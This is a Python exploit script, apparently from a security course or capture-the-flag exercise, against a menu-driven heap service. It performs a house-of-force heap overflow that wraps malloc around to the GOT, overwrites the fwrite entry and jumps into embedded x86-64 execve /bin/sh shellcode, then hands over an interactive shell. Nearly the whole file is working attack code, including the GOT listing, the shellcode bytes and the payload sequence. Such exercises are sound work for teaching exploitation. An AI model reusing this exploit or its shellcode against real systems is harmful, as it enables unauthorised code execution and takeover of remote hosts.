#!/usr/bin/python

# Lucas Burke editing the framework by Prof Chris Eagle

'''
to use:  python heap_exploit.py <ip> <port>

Press enter once, and the menu should appear 5 times.  Press enter again, and you should have a shell.
'''

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 3:
   print "usage: python heap_exploit.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

"""
0000000000602018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
0000000000602020 R_X86_64_JUMP_SLOT  strncmp@GLIBC_2.2.5
0000000000602028 R_X86_64_JUMP_SLOT  strcpy@GLIBC_2.2.5
0000000000602030 R_X86_64_JUMP_SLOT  fclose@GLIBC_2.2.5
0000000000602038 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5
0000000000602040 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000602048 R_X86_64_JUMP_SLOT  strchr@GLIBC_2.2.5
0000000000602050 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000602058 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000602060 R_X86_64_JUMP_SLOT  strtoull@GLIBC_2.2.5
0000000000602068 R_X86_64_JUMP_SLOT  strcmp@GLIBC_2.2.5
0000000000602070 R_X86_64_JUMP_SLOT  fprintf@GLIBC_2.2.5
0000000000602078 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5
0000000000602080 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000602088 R_X86_64_JUMP_SLOT  fopen@GLIBC_2.2.5
0000000000602090 R_X86_64_JUMP_SLOT  getline@GLIBC_2.2.5
0000000000602098 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
00000000006020a0 R_X86_64_JUMP_SLOT  fwrite@GLIBC_2.2.5 <<<<


Shellcode >>>:
0x603270:       0x9090909090909090      0xc031489090909090
0x603280:       0x6e69622f2fbf4850      0x50e789485768732f
0x603290:       0xb0e6894857e28948      0x9090909090050f3b
0x6032a0:       0x9090909090909090      0xffffffffffffee11
"""


got = 0x6020a0
tail = 0x603250
set_vbuf_delta = got-tail-8-128 & 0xffffffffffffffff


#build payload
shellcode = \
   "\x90"*13+"\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48" + \
   "\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"+ \
   "\x90"*13+p("<Q", 0xffffffffffffffff & ~7)+"\n"
# total size: 64 bytes

raw_input() #pause program to load up gdb

#First malloc to create shellcode chunk
#u(s, "Quit")
s.send("1\n")
#raw_input()
ru(s, "info?")
s.send("46\n") #rounded and malloc'd to 64-bytes
#raw_input()
ru(s, "year)")
s.send("A\n")

#Edit to add sc & overwrite the address 
#raw_input()
ru(s, "Quit")
s.send("2\n")
ru(s, "edit")
#raw_input()
s.send("A\n")
ru(s, "year)")
s.send(shellcode)

#Second malloc to wrap around to GOT
#raw_input()
ru(s, "Quit")
s.send("1\n")
#raw_input()
ru(s, "info?")
s.send(str(set_vbuf_delta)+"\n")
#raw_input()
ru(s, "year)")
s.send("AAAAAAAAAAAAAAA\n")

#Third malloc to overwrite the address of setvbuf
ru(s, "Quit")
s.send("1\n")
ru(s, "info?")
s.send("256\n")
ru(s, "year)")
#s.send("A"*8+"\n") 
s.send("\x70\x32\x60\x00\x00\x00\x00\x00") #<<<<<<overwrite fwrite with SC nop addr


interact(s)















































































    
#block_size = ((len(shellcode) + 32) & ~0xf) - 8
#sc_addr = add_block(s, block_size, shellcode.ljust(block_size, 'A') + p("<Q", 0xffffffffffffffff & ~7))
#top_chunk = sc_addr + block_size - 8
#got_chunk = scanf_got - 16
#big_size = (got_chunk - top_chunk) & 0xffffffffffffffff
#add_block(s, big_size - 8, "AAAA")
#add_block(s, 8, p("<Q", sc_addr))

# Once you have a shell on some socket s, maybe that's the
# same socket as above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

#interact(s)
